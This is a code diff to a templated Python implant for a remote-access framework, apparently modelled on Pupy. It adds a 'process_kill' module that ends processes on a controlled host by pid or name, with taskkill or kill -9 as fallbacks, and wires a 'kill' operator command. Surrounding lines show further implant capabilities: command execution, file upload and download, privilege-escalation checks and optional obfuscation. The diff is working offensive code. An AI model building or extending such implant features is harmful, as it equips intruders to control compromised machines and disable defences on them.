@@ -635,6 +635,7 @@ def _action_bind() -> None:
     table["network"] = lambda task: mod_network()
     table["processes"] = lambda task: mod_processes()
     table["netstat"] = lambda task: mod_netstat()
+    table["process_kill"] = lambda task: mod_process_kill(task)
 {% else %}
     table["ping"] = lambda task: {"pong": True, "id": AGENT_ID}
 {% endif %}
@@ -709,7 +710,7 @@ _OBF = _NoopObf()
 # Unconditional: the plaintext TCP ListenerClient path needs it regardless of
 # the obfuscation level.
 CAPABILITIES = [
-    {% if include_recon %}"sysinfo", "network", "processes", "netstat",{% endif %}
+    {% if include_recon %}"sysinfo", "network", "processes", "netstat", "process_kill",{% endif %}
     {% if include_exec %}"exec",{% endif %}
     {% if include_fs %}"fs_list", "fs_get", "fs_put",{% endif %}
     {% if include_privesc %}"privesc_check", "privesc_suggest",{% endif %}
@@ -1442,6 +1443,56 @@ def mod_network():
             pass
     return {"interfaces": out, "routes": routes, "listeners": listeners}
 
+def mod_process_kill(task: dict) -> dict:
+    """Terminate one process, by pid or by name.
+
+    Upstream Pupy's ``process_kill``. Destructive, so it answers ``killed`` only
+    when the process is actually gone: psutil is asked to terminate and then
+    wait, and the host's own taskkill/kill is the fallback. A kill that did not
+    happen returns ``error`` -- an operator who believes a process is dead and
+    is wrong draws the wrong conclusion about the host.
+    """
+    pid = int(task.get("pid", 0) or 0)
+    name = (task.get("name") or "").strip()
+    if not pid and not name:
+        return {"error": "process_kill needs a pid or a name"}
+
+    if not pid:
+        try:
+            import psutil
+            matches = [p.pid for p in psutil.process_iter(["name"])
+                       if (p.info.get("name") or "").lower() == name.lower()]
+        except Exception:
+            return {"error": f"cannot resolve {name} to a pid on this host"}
+        if not matches:
+            return {"error": f"no process named {name}"}
+        pid = matches[0]
+
+    try:
+        import psutil
+        proc = psutil.Process(pid)
+        proc.terminate()
+        try:
+            proc.wait(timeout=5)
+        except Exception:
+            proc.kill()
+        return {"ok": True, "pid": pid, "killed": True}
+    except Exception:
+        pass
+
+    argv = (["taskkill", "/F", "/PID", str(pid)]
+            if _pf.system().lower().startswith("win")
+            else ["kill", "-9", str(pid)])
+    try:
+        p = _sp.run(argv, capture_output=True, text=True, timeout=30)
+        if p.returncode == 0:
+            return {"ok": True, "pid": pid, "killed": True}
+        detail = (p.stderr or p.stdout or "").strip()[:200] or "the host refused the kill"
+        return {"error": detail}
+    except Exception as exc:
+        return {"error": f"kill failed: {exc}"}
+
+
 def mod_netstat():
     """Established connections, as the host itself sees them.
 
@@ -2140,7 +2191,7 @@ def _register(transport) -> tuple:
         "capabilities": [
             {% if include_exec %}"exec",{% endif %}
             "ping", "shutdown",
-            {% if include_recon %}"sysinfo", "network", "processes", "netstat",{% endif %}
+            {% if include_recon %}"sysinfo", "network", "processes", "netstat", "process_kill",{% endif %}
 
             {% if include_fs %}"fs_list", "fs_get", "fs_put",{% endif %}
             {% if include_privesc %}"privesc_check", "privesc_suggest",{% endif %}
@@ -2273,6 +2324,14 @@ def _parse_command(text: str) -> dict:
         # reaches the shell, and the shell's complaint about it reads as the
         # target's answer.
         return {"action": "processes"}
+    if v in ("kill", "process_kill"):
+        # Takes an argument, so it cannot ride the bare-verb tuple above.
+        parts = _sh.split(arg) if arg else []
+        if not parts:
+            return {"action": "process_kill"}
+        return ({"action": "process_kill", "pid": int(parts[0])}
+                if parts[0].isdigit()
+                else {"action": "process_kill", "name": parts[0]})
     if v in ("exit", "shutdown"):
         return {"action": "shutdown"}
     if v == "fs_list":
